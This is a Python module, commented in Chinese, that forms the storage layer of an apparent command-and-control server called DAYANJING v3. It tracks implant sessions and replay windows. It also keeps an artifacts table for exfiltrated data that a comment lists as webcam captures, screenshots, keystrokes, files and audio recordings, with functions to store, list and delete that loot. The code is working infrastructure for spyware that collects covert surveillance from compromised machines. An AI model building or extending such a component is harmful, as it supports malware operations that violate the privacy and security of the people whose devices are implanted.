"""
DAYANJING v3 — 服务端持久化层（13_c2_server/storage）
====================================================

SQLite 存储：会话状态、重放窗口快照、帧元数据索引。

设计约束（v3 §7、§13）：
- 重放窗口以 (implant_id, key_generation) 为键，跨重连不重置
- 快照/恢复提供持久化契约，服务端重启后可重建窗口状态
- 帧数据本身不落盘（GCM 密封后由上层分发），只存元数据索引
- 使用 WAL 模式 + 外置锁，支持多进程并发（部署多实例时必需）
"""

import os
import sqlite3
import threading
import fcntl
from contextlib import contextmanager
from typing import Optional, Set, Tuple

SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions (
    implant_id      TEXT PRIMARY KEY,
    generation      INTEGER NOT NULL,
    created_at      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS replay_windows (
    implant_id      TEXT NOT NULL,
    generation      INTEGER NOT NULL,
    highest         INTEGER NOT NULL DEFAULT -1,
    seen            TEXT NOT NULL DEFAULT '',   -- 逗号分隔的序号集合
    updated_at      INTEGER NOT NULL,
    PRIMARY KEY (implant_id, generation)
);

CREATE TABLE IF NOT EXISTS frame_index (
    request_id      BLOB PRIMARY KEY,
    implant_id      TEXT NOT NULL,
    received_at     INTEGER NOT NULL,
    format          INTEGER NOT NULL,
    size_bytes      INTEGER NOT NULL,
    FOREIGN KEY (implant_id) REFERENCES sessions(implant_id)
);

CREATE INDEX IF NOT EXISTS idx_frame_implant
    ON frame_index(implant_id, received_at);

-- 采集产物（摄像头/截图/键盘/文件/录音）
-- 去重键 (implant_id, generation, seq)：同一产物被重复上报时 INSERT OR IGNORE
-- 静默跳过，不会产生重复行，也不覆盖已存内容。
CREATE TABLE IF NOT EXISTS artifacts (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    implant_id    TEXT NOT NULL,
    generation    INTEGER NOT NULL,
    exf_type      INTEGER NOT NULL,
    seq           INTEGER NOT NULL,
    ts_us         INTEGER NOT NULL,
    width         INTEGER NOT NULL,
    height        INTEGER NOT NULL,
    flags         INTEGER NOT NULL,
    name          TEXT NOT NULL,
    size_bytes    INTEGER NOT NULL,
    sha256_hex    TEXT NOT NULL,
    received_at   INTEGER NOT NULL,
    blob          BLOB NOT NULL,
    UNIQUE(implant_id, generation, seq)
);

CREATE INDEX IF NOT EXISTS idx_artifact_implant
    ON artifacts(implant_id, received_at);
CREATE INDEX IF NOT EXISTS idx_artifact_type
    ON artifacts(exf_type, received_at);
"""


class Store:
    """SQLite 持久化。单进程内线程安全，多进程通过 fcntl 外部锁。"""

    def __init__(self, path: str):
        self._path = path
        self._lock_path = path + ".lock"
        self._local = threading.local()
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        self._init_db()

    def _connect(self) -> sqlite3.Connection:
        c = getattr(self._local, "conn", None)
        if c is None:
            c = sqlite3.connect(self._path, timeout=30, check_same_thread=False)
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.execute("PRAGMA foreign_keys=ON")
            self._local.conn = c
        return c

    def _init_db(self):
        with self._exclusive():
            conn = self._connect()
            conn.executescript(SCHEMA)
            conn.commit()

    @contextmanager
    def _exclusive(self):
        """跨进程互斥锁（fcntl.flock）。"""
        fd = os.open(self._lock_path, os.O_RDWR | os.O_CREAT, 0o600)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX)
            yield
        finally:
            fcntl.flock(fd, fcntl.LOCK_UN)
            os.close(fd)

    # ------------------------------------------------------------------
    # 会话
    # ------------------------------------------------------------------

    def upsert_session(self, implant_id: str, generation: int):
        now = int(__import__("time").time())
        with self._exclusive():
            c = self._connect()
            c.execute(
                """INSERT INTO sessions(implant_id, generation, created_at, last_seen)
                   VALUES(?, ?, ?, ?)
                   ON CONFLICT(implant_id) DO UPDATE SET
                     generation=excluded.generation,
                     last_seen=excluded.last_seen""",
                (implant_id, generation, now, now))
            c.commit()

    def touch(self, implant_id: str):
        with self._exclusive():
            c = self._connect()
            c.execute("UPDATE sessions SET last_seen=? WHERE implant_id=?",
                      (int(__import__("time").time()), implant_id))
            c.commit()

    # ------------------------------------------------------------------
    # 重放窗口快照
    # ------------------------------------------------------------------

    def save_window(self, implant_id: str, generation: int,
                    seen: Set[int], highest: int):
        seen_str = ",".join(str(s) for s in sorted(seen))
        with self._exclusive():
            c = self._connect()
            c.execute(
                """INSERT INTO replay_windows(implant_id, generation, highest, seen, updated_at)
                   VALUES(?, ?, ?, ?, ?)
                   ON CONFLICT(implant_id, generation) DO UPDATE SET
                     highest=excluded.highest,
                     seen=excluded.seen,
                     updated_at=excluded.updated_at""",
                (implant_id, generation, highest, seen_str,
                 int(__import__("time").time())))
            c.commit()

    def load_window(self, implant_id: str, generation: int
                    ) -> Optional[Tuple[Set[int], int]]:
        with self._exclusive():
            c = self._connect()
            row = c.execute(
                "SELECT highest, seen FROM replay_windows WHERE implant_id=? AND generation=?",
                (implant_id, generation)).fetchone()
        if row is None:
            return None
        highest = row[0]
        seen = set(int(x) for x in row[1].split(",") if x) if row[1] else set()
        return (seen, highest)

    # ------------------------------------------------------------------
    # 帧索引
    # ------------------------------------------------------------------

    def index_frame(self, request_id: bytes, implant_id: str,
                    fmt: int, size: int):
        with self._exclusive():
            c = self._connect()
            c.execute(
                "INSERT OR IGNORE INTO frame_index VALUES(?, ?, ?, ?, ?)",
                (request_id, implant_id, int(__import__("time").time()),
                 fmt, size))
            c.commit()

    # ------------------------------------------------------------------
    # 采集产物
    # ------------------------------------------------------------------

    def put_artifact(self, implant_id: str, generation: int, exf_type: int,
                     seq: int, ts_us: int, width: int, height: int,
                     flags: int, name: str, blob: bytes) -> Optional[int]:
        """写入一条采集产物。重复 (implant_id, generation, seq) 返回 None。

        blob 以 BLOB 存入库，不做任何转码；sha256 用于完整性核对与去重查证。
        """
        import hashlib as _hl
        with self._exclusive():
            c = self._connect()
            cur = c.execute(
                """INSERT OR IGNORE INTO artifacts
                   (implant_id, generation, exf_type, seq, ts_us, width, height,
                    flags, name, size_bytes, sha256_hex, received_at, blob)
                   VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                (implant_id, generation, exf_type, seq, ts_us, width, height,
                 flags, name, len(blob),
                 _hl.sha256(blob).hexdigest(),
                 int(__import__("time").time()), sqlite3.Binary(blob)))
            c.commit()
            if cur.rowcount == 0:
                return None
            return cur.lastrowid

    def get_artifact(self, artifact_id: int) -> Optional[dict]:
        with self._exclusive():
            c = self._connect()
            row = c.execute(
                """SELECT id, implant_id, generation, exf_type, seq, ts_us,
                          width, height, flags, name, size_bytes, sha256_hex,
                          received_at, blob
                   FROM artifacts WHERE id=?""", (artifact_id,)).fetchone()
        return self._row_to_dict(row)

    def list_artifacts(self, implant_id: Optional[str] = None,
                       exf_type: Optional[int] = None,
                       limit: int = 100) -> list:
        sql = """SELECT id, implant_id, generation, exf_type, seq, ts_us,
                        width, height, flags, name, size_bytes, sha256_hex,
                        received_at, blob
                 FROM artifacts"""
        where, args = [], []
        if implant_id is not None:
            where.append("implant_id=?")
            args.append(implant_id)
        if exf_type is not None:
            where.append("exf_type=?")
            args.append(exf_type)
        if where:
            sql += " WHERE " + " AND ".join(where)
        sql += " ORDER BY received_at DESC, id DESC LIMIT ?"
        args.append(limit)
        with self._exclusive():
            c = self._connect()
            rows = c.execute(sql, args).fetchall()
        return [self._row_to_dict(r) for r in rows]

    def count_artifacts(self, implant_id: Optional[str] = None,
                        exf_type: Optional[int] = None) -> int:
        sql = "SELECT COUNT(*) FROM artifacts"
        where, args = [], []
        if implant_id is not None:
            where.append("implant_id=?")
            args.append(implant_id)
        if exf_type is not None:
            where.append("exf_type=?")
            args.append(exf_type)
        if where:
            sql += " WHERE " + " AND ".join(where)
        with self._exclusive():
            c = self._connect()
            return int(c.execute(sql, args).fetchone()[0])

    def delete_artifacts(self, implant_id: str) -> int:
        """按 implant 清除产物，返回删除行数。"""
        with self._exclusive():
            c = self._connect()
            cur = c.execute("DELETE FROM artifacts WHERE implant_id=?",
                            (implant_id,))
            c.commit()
            return int(cur.rowcount)

    @staticmethod
    def _row_to_dict(row) -> Optional[dict]:
        if row is None:
            return None
        return {
            "id": row[0], "implant_id": row[1], "generation": row[2],
            "exf_type": row[3], "seq": row[4], "ts_us": row[5],
            "width": row[6], "height": row[7], "flags": row[8],
            "name": row[9], "size_bytes": row[10], "sha256_hex": row[11],
            "received_at": row[12], "blob": bytes(row[13]),
        }
